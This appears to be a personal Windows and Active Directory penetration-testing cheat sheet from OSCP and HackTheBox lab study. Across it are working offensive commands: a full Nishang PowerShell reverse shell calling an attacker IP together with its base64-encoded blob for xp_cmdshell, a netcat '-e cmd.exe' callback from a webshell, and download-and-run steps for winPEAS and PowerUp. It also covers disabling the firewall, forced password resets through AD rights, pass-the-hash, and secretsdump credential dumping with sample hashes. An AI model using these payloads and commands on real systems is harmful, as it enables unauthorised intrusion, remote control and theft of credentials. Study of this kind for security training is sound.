CP:> certutil -hashfile Database.kdbx MD5                                       # Windows enum Basics - Get the md5 chck sum of a file  
```
-----

### wmic check (from htb on AD)
Docs - https://learn.microsoft.com/en-us/windows/win32/wmisdk/using-wmi

```sh
wmic qfe get Caption,Description,HotFixID,InstalledOn 	                            # wmi checks (htb AD)- Prints the patch level and description of the Hotfixes applied
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List 	# wmi checks (htb AD)- Displays basic host information to include any attributes within the listwmic process list /format:list 	                                                                       # wmi checks (htb AD)- A listing of all processes on host
wmic ntdomain list /format:list 	                                                # wmi checks (htb AD)- Displays information about the Domain and Domain Controllers
wmic useraccount list /format:list 	                                                # wmi checks (htb AD)- Displays information about all local accounts and any domain accounts that have logged into the device
wmic group list /format:list 	                                                    # wm checks (htb AD)- Information about all local groups
wmic sysaccount list /format:list 	                                                # wmi checks (htb AD)- Dumps information about any system accounts that are being used as service accounts.
```


####  Windows Firewall and Network Security Management Commands

```sh
## General Firewall State Check

# When enumerating Windows Firewalls, considerthat some ports may be open but only for specific programs. We need the customs rules which permit all software.

# Check the current firewall profile state
netsh advfirewall show currentprofile           # Windows Firewall - Netsh - Check if the firewall is on
Get-NetFirewallProfile                          # Windows Firewall - PowerShell - Display current firewall profile states

# Display all firewall rules
CP:> netsh advfirewall firewall show rule name=all   # Windows Firewall - Netsh - Show all rules
CP:> netsh advfirewall firewall show rule dir=in name=all   # Windows Firewall - Netsh - Show inbound rules
CP:> netsh advfirewall firewall show rule dir=out name=all   # Windows Firewall - Netsh - Show outbound rules
CP:> Get-NetFirewallRule                             # Windows Firewall - PowerShell - List all firewall rules
CP:> Get-NetFirewallRule -Direction Inbound          # Windows Firewall - PowerShell - List all inbound rules
CP:> Get-NetFirewallRule -Direction Outbound         # Windows Firewall - PowerShell - List all outbound rules
CP:> Get-NetFirewallRule -Direction Outbound -Action Allow | Get-NetFirewallPortFilter | Select-Object -ExpandProperty LocalPort | Sort-Object -Unique     # Windows Firewall -List all the allowed outbound ports 


# Add or modify firewall rules
 netsh advfirewall firewall add rule name="Allow HTTP" dir=in action=allow protocol=TCP localport=80         # Windows Firewall - Netsh - Allow HTTP (port 80)
PS:> netsh advfirewall firewall add rule name="TunnelingInbound" dir=in action=allow protocol=TCP localport='80,443,4444'         # Windows Firewall - Netsh add a firewall rule inbound to open 3 ports 
PS:> netsh advfirewall firewall add rule name="TunnelingOutbound" dir=out action=allow protocol=TCP remoteport='80,443,4444'         # Windows Firewall - Netsh add a firewall rule Outbound to open 3 ports  
PS:> netsh advfirewall set allprofiles state off                                   # Windows Firewall - Turn off all walls                     
New-NetFirewallRule -DisplayName "Allow SSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow   # Windows Firewall - PowerShell - Allow SSH (port 22)


# Remove or reset firewall rules
netsh advfirewall firewall delete rule name="Allow HTTP"   # Windows Firewall - Netsh - Remove a specific rule
Remove-NetFirewallRule -DisplayName "Allow SSH"            # Windows Firewall - PowerShell - Remove a specific rule
netsh advfirewall reset                                    # Windows Firewall - Netsh - Reset all firewall rules to default


# Save or reload rules
netsh advfirewall export "C:\FirewallRules.wfw"            # Windows Firewall - Netsh - Export current rules to a file
netsh advfirewall import "C:\FirewallRules.wfw"            # Windows Firewall - Netsh - Import firewall rules from a file


# Check logs or debug firewall issues
wevtutil qe Microsoft-Windows-WindowsFirewall/Firewall               # Windows Firewall - Event Viewer - View Windows Firewall logs
Get-WinEvent -LogName "Microsoft-Windows-WindowsFirewall/Firewall"   # Windows Firewall - PowerShell - View Windows Firewall logs

# Perform advanced tasks like checking connections or processes
netstat -ano                                    # Windows Firewall - Check active connections and their PIDs
tasklist /svc                                   # Windows Firewall - Map running processes to their services
Get-NetTCPConnection                            # Windows Firewall - PowerShell - List active TCP connections
Resolve-DnsName <hostname>                      # Windows Firewall - PowerShell - Resolve a hostname to an IP address
```




### Windows based tools

GTFObins but for Windows - https://lolbas-project.github.io/#
GTFObin for Active Directory - https://wadcoms.github.io/

Run dnSpy to look atthe .exe file
- wget https://github.com/dnSpy/dnSpy/releases/download/v6.1.8/dnSpy-net-win64.zip
Install wine 
- `sudo apt install wine64 -y`



#### [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

While there are often missing findings by **winPEAS**, the sheer amount of information resulting from its execution demonstrates how much time we can save in order to avoid manually obtaining all this information.

Automated tools can be blocked by AV solutions. If so:
- we can apply techniques learned in the Module "Antivirus Evasion"
- try other tools such as [Seatbelt](https://github.com/GhostPack/Seatbelt) and [JAWS](https://github.com/411Hall/JAWS) 
- or do the enumeration manually.

Binaries [here](https://github.com/carlospolop/PEASS-ng/releases/tag/20240128-3084e4e1)

To upload to a host you can use `upload` in Evil-winRM

Then to get the ansi colors out out to get a html file, use.
```sh
-----STARTING with BASH use the script module to record the output
script output.txt

-----EVIL on to Windows OR whatever your action is...
*Evil-WinRM* PS C:\Users\FSmith\Documents> .\winPEASx64_ofs.exe

-----EXIT back to BASH

ansi2html < output.txt > term.html

```

```
sudo apt install peass
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
PS:> iwr -uri http://192.168.179.188/winPEASx64.exe -Outfile winPEAS.exe
PS:> .\winPEAS.exe -c                                                             # Winpeas needs -c to run in the colour for some reason
PS:> .\winPEASx64.exe | Tee-Object -FilePath WinPEAS-REPORT.txt                   # Winpeas - Run AND generate a Report

```
current on machine at /home/kali/OSCP/AttackingAD/winPEASx64.exe

#### Seatbelt
- https://github.com/GhostPack/Seatbelt

Seatbelt info - https://docs.specterops.io/ghostpack/seatbelt/introduction


```
iwr -uri http://192.168.179.188/Seatbelt.exe -Outfile Seatbelt.exe
./Seatbelt.exe -group=all
./Seatbelt.exe -group=all -full -outputfile="C:\Temp\out.txt"'

Seatbelt.exe -group=user -full          user-level data     # Seatbelt scan - user info
Seatbelt.exe -group=system -full        system-level data   # Seatbelt scan - system info
Seatbelt.exe -group=network -full       network info        # Seatbelt scan - network info
Seatbelt.exe -group=security -full      security info       # Seatbelt scan - security info

Seatbelt.exe InterestingFiles                               # Seatbelt scan - finds juicy user files
Seatbelt.exe PowerShellHistory                              # Seatbelt scan - checks PS command history
Seatbelt.exe CloudCredentials                               # Seatbelt scan - looks for AWS/GCP creds
Seatbelt.exe PuttySessions                                  # Seatbelt scan - finds saved SSH configs
Seatbelt.exe WindowsAutoLogon                               # Seatbelt scan - checks for autologin creds
Seatbelt.exe RDPSavedConnections                            # Seatbelt scan - shows saved RDP targets
Seatbelt.exe RDPSettings                                    # Seatbelt scan - checks RDP config
Seatbelt.exe TokenPrivileges                                # Seatbelt scan - lists current token powers
Seatbelt.exe CredEnum                                       # Seatbelt scan - saved user credentials
Seatbelt.exe SlackDownloads                                 # Seatbelt scan - checks Slack file dumps
Seatbelt.exe KeePass                                        # Seatbelt scan - locates KeePass configs
Seatbelt.exe ChromiumHistory                                # Seatbelt scan - inspects browser history
Seatbelt.exe FirefoxHistory                                 # Seatbelt scan - inspects Firefox history
Seatbelt.exe FileZilla                                      # Seatbelt scan - finds FTP creds/configs
Seatbelt.exe WindowsVault                                   # Seatbelt scan - IE/Edge saved credentials
Seatbelt.exe -group=all -full > C:\Temp\seatbelt-output.txt # Seatbelt scan - full system report
Seatbelt.exe -group=all -full           full system report  # scan - security info


```

Get a Seatbelt binary from here : https://github.com/r3motecontrol/Ghostpack-CompiledBinaries or build it locally

### Windows enum Basics -Tools 

- Winpeas

### Windows Shell
`dir "root.txt" /s` : find a file named `root.txt`
`type root.txt` : Same as `echo root.txt` in `BASH`

Apparently `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"` is a command for Windows. When executed in the Command Prompt, it provides information about the operating system, including the OS name and version. 

```
pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.129.71.19 cmd      # get a windows shell from linux with a hash like this 
```


### Windows shell/powershell commands

About [Powershell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1)

```
Get-Service where {$_.Status -eq "Running"}     # See what service are running
net groups /domain                            # This will llist all the groups 
type WindowsUpdate.log | findstr KB  # This will show us when the updates were actually installing patches
```


-  
#### What is powersploit and Powerview? 
Powerview is a Powershell module which gives you access to a bunch of active directory queries.


## Windows Privesc


```
K:> sudo git clone https://github.com/itm4n/PrivescCheck.git                        # Windows Privesc -  Get the powershell script for PrivescCheck
P:> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"            # Windows Privesc -  Run it on the target
```





### Windows Service Binary Hijacking for PrivEsc
**Listing the running Services**
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}         # Windows Privesc - Listing the running Services for  Service Binary Hijacking
```
We can choose between the traditional _icacls_ Windows utility or the PowerShell Cmdlet [Get-ACL](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2) For this example, we'll use icacls since it usable both in PowerShell and the Windows command line.

```
icacls "C:\path\to\Bin\file.exe"              # Windows Privesc - Listing the running Services for  Service Binary Hijacking
```

The `icacls` utility outputs the corresponding principals and their [permission mask](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) The most relevant permissions and their masks are listed below:

| Mask |       Permissions       |             |
| :--: | :---------------------: | ----------- |
|  F   |       Full access       | Can replace |
|  M   |      Modify access      | Can replace |
|  RX  | Read and execute access |             |
|  R   |    Read-only access     |             |
|  W   |    Write-only access    |             |
|  FI  | Full access ( Inherited)| ?? Can replace |


```
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'mysql'}         # Windows Privesc -IF the service has "Auto" and we have the SeShutdownPrivilege we could restat the service. Service Binary Hijacking
```

```
(OI) = Object Inherit               # icacls - permissions This means that the permission applies to files within the directory.

(CI) = Container Inherit            # icacls - permissions - This means it applies to subdirectories.

(IO) = Inherit Only                 # icacls - permissions -  This permission is not applied to the folder itself, only to its children.

Now the letters for permissions:    # icacls - permissions
(F) = Full control                  # icacls - permissions
(RX) = Read and execute             # icacls - permissions
(M) = Modify                        # icacls - permissions
```



##### Powerup.ps1 ( Ppwershell script to look for Priv esc though Binaries etc)

(Requires Admin). We should never blindly trust or rely on the output of automated tools. However, [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) is a great tool to identify potential privilege escalation vectors, which can be used to automatically check if the vulnerability can be exploited. If this is not the case, we should do some manual analysis if the potential vector is not vulnerable or the AbuseFunction just cannot exploit it.
Also see: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
https://powersploit.readthedocs.io/en/latest/Privesc/

```
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80

PS C:\Users\dave> iwr -uri http://192.168.179.188/PowerUp.ps1 -Outfile PowerUp.ps1;InvokeAllChecks
PS C:\Users\dave> powershell -ep bypass  # ExecutionPolicy Bypass. Else, running scripts are blocked.
...
PS C:\Users\dave>  . .\PowerUp.ps1                                                                           # Windows Privesc PowerUp - Use power up and then list all modifiable services as vectors
PS C:\Users\dave> Get-ModifiableService File                                                                 # Windows Privesc PowerUp - Use power up and then list all modifiable services as vectors
PS C:\Users\dave> AbuseFunction                                                                              # Windows Privesc PowerUp - Use power up and then list all modifiable services as vectors
PS C:\Users\dave>  Invoke-ServiceAbuse                                                                       # Windows Privesc PowerUp - modifies a vulnerable service to create a local admin or execute a custom command - But not always reliable

PS C:\Users\dave>  Get-ModifiablePath                                                                        # Windows Privesc PowerUp - could also be used for current user
PS C:\Users\dave> Restart-Service -Name 'SERVICE_NAME'


PS C:\Users\dave>  Get-UnquotedService                                                                       # Windows Privesc PowerUp - Check for unquoted service paths for service binary hijacking    
PS C:\Users\dave>  Write-ServiceBinary -Name VulnSVC -Path "C:\Program Files\Enterprise Apps\Current.exe"    # Windows Privesc PowerUp - Creates a binary which will by default adds a local Administrator (john/Tuesday@2   
```

#### from the HTB REEL box
```
PS Q:\> Set-DomainObjectOwner -Identity Herman -OwnerIdentiy nico  
PS Q:\> Add-DomainObjectAcl -TargetIdentity Herman -PrincipleIdentity nico -Rights ResetPasswoird -Verbose

# Change Hermans Passowrd
PS Q:\>$pass = ConvertTo-SecureStrings 'PleaseSubscribe!' -AsPlainText -Force
PS Q:\> Set-DomainUserPassword Herman -AccountPassword $pass -Verbose

# See what groups we are members of
PS Q:\> Get-DomainGroup -MemberIdentiy Herman | select samaccountname

# Create a new credential 
PS Q:\> $cred = New-Object System.Manage,ment.Automation.PSCredential('HTB\Herman',$pass)

# Add ourselves to a admin group
PS Q:\> Add-DomainGroupMember -Identity 'Backup_Admins' -Members herman -Credential $cred
```

### Run cmds as others

IF we have a shell and we want to run commands as another we can do the following 
```
P:> $pass = ConvertTo-SecureString "36mEAhz/B8xQ~2VM" -AsPlainText -Force                   # PS Run commands as others - 1. convert Known password to secure string
P:> $cred = New-Object System.Management.Automation.PSCredential("sniper\\Chris", $pass)    # PS Run commands as others - 2. Create a credential with the Host\\username and $pass
P:> Invoke-Command -ComputerNAme Sniper -Credential $cred -ScriptBlock {whoami}             # PS Run commands as others - 3. Run CMds as the user
```




### nishang
https://github.com/samratashok/nishang
Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security and post exploitation during Penetration Tests. 


From htb Scrambled

sudo apt-get install nishang   
```
└─$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 rev.ps1  
```


Edit `rev.ps1`
    - Take the first two and last two coments out, and also uncoment the client line

So from this
```sh
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
#$client = New-Object System.Net.Sockets.TCPClient('192.168.179.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

#$sm=(New-Object Net.Sockets.TCPClient('192.168.179.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```

...to this.

```sh
$client = New-Object System.Net.Sockets.TCPClient('192.168.179.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Then set `rev.ps1` callback ip 

```sh
$client = New-Object System.Net.Sockets.TCPClient('<CALLBACK_IP_ADDRESS>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```sh
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.42',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Note: AMSI will block it if Defender is installed onthe box, otherwise this should work.

Lastly we should format `rev.ps1` into a powershell base 64 for ease of transport and use.

```sh
cat rev.ps1 | iconv -t UTF-16LE    
# this will change the format to powershell bas64 format and how its printed. 
# This means we can pass in the b64 straight to powershell 

# it will lok the same in the terminal but if we look closer...

# We can see now everything is two bytes....

cat rev.ps1 | iconv -t UTF-16LE | xxd
00000000: 2400 6300 6c00 6900 6500 6e00 7400 2000  $.c.l.i.e.n.t. .
00000010: 3d00 2000 4e00 6500 7700 2d00 4f00 6200  =. .N.e.w.-.O.b.
00000020: 6a00 6500 6300 7400 2000 5300 7900 7300  j.e.c.t. .S.y.s.
00000030: 7400 6500 6d00 2e00 4e00 6500 7400 2e00  t.e.m...N.e.t...
00000040: 5300 6f00 6300 6b00 6500 7400 7300 2e00  S.o.c.k.e.t.s...
00000050: 5400 4300 5000 4300 6c00 6900 6500 6e00  T.C.P.C.l.i.e.n.
00000060: 7400 2800 2700 3100 3900 3200 2e00 3100  t.(.'.1.9.2...1.
00000070: 3600 3800 2e00 3200 3500 3400 2e00 3100  6.8...2.5.4...1.
00000080: 2700 2c00 3400 3400 3400 3400 2900 3b00  '.,.4.4.4.4.).;.

# ...whereas without 
cat rev.ps1 | xxd                    
00000000: 2463 6c69 656e 7420 3d20 4e65 772d 4f62  $client = New-Ob
00000010: 6a65 6374 2053 7973 7465 6d2e 4e65 742e  ject System.Net.
00000020: 536f 636b 6574 732e 5443 5043 6c69 656e  Sockets.TCPClien
00000030: 7428 2731 3932 2e31 3638 2e32 3534 2e31  t('192.168.179.1
00000040: 272c 3434 3434 293b 2473 7472 6561 6d20  ',4444);$stream 
00000050: 3d20 2463 6c69 656e 742e 4765 7453 7472  = $client.GetStr
00000060: 6561 6d28 293b 5b62 7974 655b 5d5d 2462  eam();[byte[]]$b
00000070: 7974 6573 203d 2030 2e2e 3635 3533 357c  ytes = 0..65535|
00000080: 257b 307d 3b77 6869 6c65 2828 2469 203d  %{0};while(($i =
...
```

Lastly we can get rid of line wrapping and the take the out put and give it directly to Powesershell.
This will give us out `ENCODED-BASE64-NISHANG-BLOB`
```sh
cat rev.ps1 | iconv -t UTF-16LE | base64 -w 0    # 
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADIANQA0AC4AMQAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA  

# as per This impacket-mssqlClient tool
└─$ impacket-mssqlclient -k dc1.scrm.local
...
...
SQL (SCRM\administrator  dbo@master)> xpcmdshell powershell -enc <ENCODED-BASE64-NISHANG-BLOB>
```
**Note** that on windows its also best to place these kind of payloads `powershell -enc <ENCODED-BASE64-NISHANG-BLOB>` into `.bat` files becasue **.bat file are executed automaticaly by windows, where as Powershell files are not.**

---


## Port forwarding on Windows

#### Use Plink to create a remote port forward to access the RDP service on Windows machien with ha webshell.
1. Appache 2 to serve up nc (native to kali).
`A1~:$ sudo systemctl start apache2`
webshell.
1. Find local `nc` to share
`A1~:$ find / -name nc.exe 2>/dev/null`
webshell.
1. Copy `nc` to our kali webserver (WS) dir
`A1~:$ sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/`
webshell.
1. Find local `Plink` to share
`A1~:$ find / -name plink.exe 2>/dev/null`
webshell.
1. Copy `Plink` to our local kali webserver dir 
`A1~:$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/`
webshell.
1. Download nc from our victims webshell
`WS:> powershell wget -Uri http://192.168.179.189/nc.exe -OutFile C:\Windows\Temp\nc.exe`
webshell.
1. Set up a local listener 
`nc -nvlp 4446`
webshell.
1. On the WS , pop rev shell
`WS:> C:\Windows\Temp\nc.exe -e cmd.exe 192.168.179.189 4446`
webshell.
1. From the RevShell DL Plink (RS)
`RS:>powershell wget -Uri http://192.168.179.189/plink.exe -OutFile C:\Windows\Temp\plink.exe`
webshell.
1. Set up remote port forward to access Victim from rdp on kali
`WS> C:\Windows\Temp\plink.exe -ssh -l domain2 -pw **** -R 127.0.0.1:9833:127.0.0.1:3389 192.168.179.189`
`WS> C:\Windows\Temp\plink.exe -ssh -l domain2 -pw **** -R LOCAL-SOCKET:VICTIM-RDPSOCKET <ATTACK-IP>`
Similar to the OpenSSH client remote port forward command. **-R** pass the socket we want to open on the Kali SSH server, and the RDP server port on the loopback interface of victim that we want to forward packets to.
- username (**-l**) 
- password (**-pw**) directly on the command line.
**The entire command would be: 
`WS> cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw **** -R LOCAL-SOCKET:VICTIM-RDPSOCKET <ATTACK-IP>` .
webshell.
1. Confirm  locally that the port has opened:
- `A1~:$ ss -tulpn`

1. Launch rdp
```
xfreerdp3  /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833 /size:1920x1080 /smart-sizing
```

#### Port forwarding with Netsh 

MutliServer 192.168.179.64
PGdataBase 10.4.235.215

1. RDP directly into 
`xfreerdp3  /u:rdp_admin /p:P@ssw0rd! /v:192.168.179.64`
1. Instruct **netsh interface** to **add** a **portproxy** rule from an IPv4 listener that is forwarded to an IPv4 port (**v4tov4**). This will listen on port 2222 on the external-facing interface (**listenport=2222 listenaddress=192.168.179.64**) and forward packets to port 22 on PGDATABASE01 (**connectport=22 connectaddress=10.4.235.215**).
`RDS:> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.179.64 connectport=22 connectaddress=10.4.235.215`
1. Confim port is now listening on the Windows machine 
`RDS:> netstat -anp TCP | find "2222"`
1. Confirm port forward is stored
`RDS:> netsh interface portproxy show all`
1. Problem with port being filtered . If we run below , we shall see its filtered from the firewall
```
A1~:$ sudo nmap -sS 192.168.179.64 -Pn -n -p2222
...
PORT     STATE    SERVICE
2222/tcp filtered EtherNetIP-1
...
```

1. We will need to poke a hole in the firewall on MULTISERVER03.
**We'll also need to remember to plug that hole as soon as we're finished with it!**
Use the **netsh advfirewall firewall** subcontext to create the hole. We will use the **add rule** command and name the rule "port_forward_ssh_2222". We need to use a memorable or descriptive name, because we'll use this name to delete the rule later on.
We'll **allow** connections on the local port (**localport=2222**) on the interface with the local IP address (**localip=192.168.179.64**) using the TCP protocol, specifically for incoming traffic (**dir=in**).
```
RDS:> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.179.64 localport=2222 action=allow

Ok.
```
1. Check again how the port appears from the attack machine again.

```
A1~:$ sudo nmap -sS 192.168.179.64 -Pn -n -p2222
...
PORT     STATE    SERVICE
2222/tcp open EtherNetIP-1
...
```
1. We can now SSH to port 2222 on MULTISERVER03, as though connecting to port 22 on PGDATABASE01.

```
A1~:$ ssh database_admin@192.168.179.64 -p2222
```

1. Once we're done with the connection, we need to remember to delete the firewall rule we just created.
```
RDS:> netsh advfirewall firewall delete rule name="port_forward_ssh_2222"

Deleted 1 rule(s).
Ok.
```

1. Also delete the port forward we created.
```
RDS:> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.179.64

C:\Windows\Administrator>
```

Note: Most Windows Firewall commands have PowerShell equivalents with commandlets like `New-NetFirewallRule` and `Disable-NetFirewallRule.` **However**, the `netsh interface portproxy` command doesn't. For simplicity, we've stuck with pure `Netsh` commands in this section. 
**However, for a lot of Windows Firewall enumeration and configuration, PowerShell is extremely useful. You may wish to experiment with it while completing the exercises for this section.**

#### Alt Remote connections to xfreerdp3  
```sh
proxychains rdesktop <TARGET-IP> -u USERNAME -p PASSWD  -d offsec.live          # Alt Remote connections to xfreerdp3  - rdesktop via proxychains
proxychains impacket-psexec USERNAME:PASSWD@<TARGET-IP>                         # Alt Remote connections to xfreerdp3  - rdesktop via proxychains
```

---



## Changieng a Users password ( eg is you have GenericAll)
```
Import-Module .\PowerView.ps1                                                                            # 1 -Changieng a Users password ( eg is you have GenericAll)
```
1. Attacker creates a PW object
```         
$SecPassword = ConvertTo-SecureString 'ichliebedich' -AsPlainText -Force                                 # 2 - Changieng a Users password ( eg is you have GenericAll)
```
2. Attack creates a secure cred object
```
$Cred = New-Object System.Management.Automation.PSCredential('OLIVIA@ADMINISTRATOR.HTB', $SecPassword)  # 3 - Changieng a Users password ( eg is you have GenericAll)
```
3. Set the new password value
```
$UserPassword = ConvertTo-SecureString 'P@ssword123!' -AsPlainText -Force                               # 4 - Changieng a Users password ( eg is you have GenericAll)
```
4. Change the password
```
Set-DomainUserPassword -Identity michael -AccountPassword $UserPassword -Credential $Cred               # 5 - Changieng a Users password ( eg is you have GenericAll)
```
5. veryfy by logging in 

```
evil-winrm -i <target_ip> -u michael -p 'P@ssword123!'                                                  # 6 - Changieng a Users password ( eg is you have GenericAll)
```

**Remember** - Although you change a users password via powershell, might not mean they have WINRM access

6. Alt - Change from Kali

```
K:> snet rpc password "michael" "Password1" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.129.111.58  # 7 alt - - Changieng a Users password ( eg is you have GenericAll) - stright from KALI
```

----


## Impacket

#### secretsDump
If we have obtained a user name and password of someone with DCSync privleges we can obtain the hashes of other users and then uses these to login in with `secretsdump`
- `impacket-secretsdump <DOMAIN>/<USERNAME@<IP_ADDRESS>`
- `impacket-secretsdump EGOTISTICAL-BANK/svc_loanmgr@10.129.95.180`
We can specifiy a single user with `-just-dc-user Administrator` as in 
- `impacket-secretsdump <DOMAIN>/<USERNAME@<IP_ADDRESS> -just-dc-user Administrator`

```sh
impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local                                       # impacket-secretsdump example - OFfsec PG: Resourced
# OP-HASH: Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::                 # impacket-secretsdump example - OFfsec PG: Resourced
# Format it to use/Roast; like: aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f                 # impacket-secretsdump example - OFfsec PG: Resourced
```

#### ippsecs fav secrets dump which gives the history
```
impacket-secretsdump -user-status -history -pwd-last-set administrator.htb/ethan@10.129.238.166  # ippsecs fav secrets dump which gives the history
```


<details>
	<summary>Example output</summary>

```
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
[*] Cleaning up... 
```
</details>


```
K:> impacket-secretsdump -sam SAM -system SYSTEM LOCAL                        # Windows Privesc - if we find SAM and SYSTEM on a windows machine we can uses secretsdump to dump all the hashes ( OSCP B )

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
